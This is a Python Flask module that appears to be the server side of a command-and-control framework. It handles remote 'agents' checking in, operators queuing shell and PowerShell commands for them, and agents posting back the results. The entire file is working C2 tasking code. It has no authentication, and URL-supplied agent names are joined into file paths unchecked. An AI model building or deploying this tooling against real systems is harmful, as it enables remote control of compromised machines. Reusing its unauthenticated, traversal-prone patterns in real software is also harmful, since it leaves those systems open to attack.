from flask import Blueprint, render_template, request
from ..listeners.listeners import load_listeners
from .agent_info import AgentInfo
from .tasks import Tasks
from random import choice
from string import ascii_uppercase
import flask
import os
import json
agents_bp = Blueprint('agents', __name__, template_folder='templates', static_folder='static')

class Agent:

    def __init__(self, agent_name, listener_name, listener_type, bind_address, bind_port, agent_type, remote_address, hostname):

        self.agent_name = agent_name
        self.listener_name = listener_name
        self.listener_type = listener_type
        self.bind_address = bind_address
        self.bind_port = bind_port
        self.agent_type = agent_type
        self.remote_address = remote_address
        self.hostname = hostname
        self.sleep = 3
        self.path = f"database/agents/{self.agent_name}"
        self.taskPath =  f"database/agents/{self.agent_name}/task"
        self.resultPath = f"database/agents/{self.agent_name}/result"
        os.makedirs(self.path, exist_ok=True)

    def save(self):
        data = {
            'agent_name': self.agent_name,
            'listener_name': self.listener_name,
            'listener_type': self.listener_type,
            'bind_address': self.bind_address,
            'bind_port': self.bind_port,
            'agent_type': self.agent_type,
            'remote_address': self.remote_address,
            'hostname': self.hostname,
        }
        filename = os.path.join(self.path, f"{self.agent_name}_agent.json")
        with open(filename, 'w') as f:
            json.dump(data, f)

    def writeTask(self, task):
        if self.agent_type == "PowerShell":
            task = "VALID " + task
            with open(self.taskPath, "w") as f:
                f.write(task)

    def shell(self, args):

        if len(args) == 0:
            print("Missing command.")
        else:
            self.writeTask("shell " + args)

    def powershell(self, args):

        if len(args) == 0:
            print("Missing command.")
        else:
            self.writeTask("powershell " + args)

    def tasks(self, command, args):
        if command == "shell":
            self.shell(args)
        elif command == "powershell":
            self.powershell(args)

@agents_bp.route('/', methods=['GET'])
def agents():
    agents = []

    agents_directory = "database/agents/"
    if os.path.exists(agents_directory):
        for agent_name in os.listdir(agents_directory):
            file_path = os.path.join(agents_directory, agent_name, f"{agent_name}_agent.json")
            with open(file_path, 'r') as f:
                data = json.load(f)

            agent = Agent(**data)

            agents.append((agent.agent_name,
                              agent.listener_name,
                              agent.agent_type,
                              agent.remote_address,
                              agent.hostname))

    return render_template('agents.html', agents = agents)

@agents_bp.route('/register', methods=['POST'])
def agent_register():
    if request.method == 'POST':
        hostname = flask.request.form.get("name")
        agent_type = flask.request.form.get("type")
        remote_address = flask.request.form.get("remote_ip")
        bind_address = flask.request.remote_addr
        print('agent checked in', remote_address, hostname, agent_type)

        listener_list = load_listeners()
        for listener in listener_list:
            if listener[3] == bind_address:
                agent_name = ''.join(choice(ascii_uppercase) for i in range(6))
                agent = Agent(agent_name, listener[0], listener[1], listener[3], listener[4], agent_type, remote_address, hostname)
                agent.save()
                return agent_name, 200
    return "Agent register fail", 404

@agents_bp.route('/<agent>/info', methods=['GET'])
def agent_info(agent):
    agents_directory = "database/agents/"
    file_path = os.path.join(agents_directory, agent, f"{agent}_agent.json")

    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            data = json.load(f)

        agent = Agent(**data)
        form = AgentInfo(obj=agent)
        return render_template('agent_info.html', agent=agent, form = form)

    return "Agent not found", 404

@agents_bp.route('/<agent>/interact', methods=['GET', 'POST'])
def agent_interact(agent):
    agents_directory = "database/agents/"
    file_path = os.path.join(agents_directory, agent, f"{agent}_agent.json")

    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            data = json.load(f)

        agent = Agent(**data)

    form = Tasks()
    result = ""
    if request.method == 'POST':
        if form.is_submitted():
            task = form.tasks.data.strip().split(maxsplit=1)
            agent.tasks(task[0], task[1])
        result_path = agent.resultPath
        if os.path.exists(result_path):
            with open(result_path, 'r') as f:
                result = f.read()
        open(agent.resultPath, 'w').close()

    return render_template('agent_interact.html', agent = agent, form = form, result = result)

@agents_bp.route('/<agent>/task', methods=['GET'])
def agent_task(agent):
    agents_directory = "database/agents/"
    file_path = os.path.join(agents_directory, agent, f"{agent}_agent.json")

    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            data = json.load(f)

        agent = Agent(**data)
    if os.path.exists(agent.taskPath):
        with open(agent.taskPath, 'r') as f:
            task = f.read()
        open(agent.taskPath, 'w').close()
        return task, 200
    else:
        return '', 204

@agents_bp.route('/<agent>/result', methods=['POST'])
def agent_result(agent):
    result = flask.request.form.get("result")
    agents_directory = "database/agents/"
    file_path = os.path.join(agents_directory, agent, f"{agent}_agent.json")

    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            data = json.load(f)

        agent = Agent(**data)
    with open(agent.resultPath, 'w') as f:
        f.write(result)
    return '',204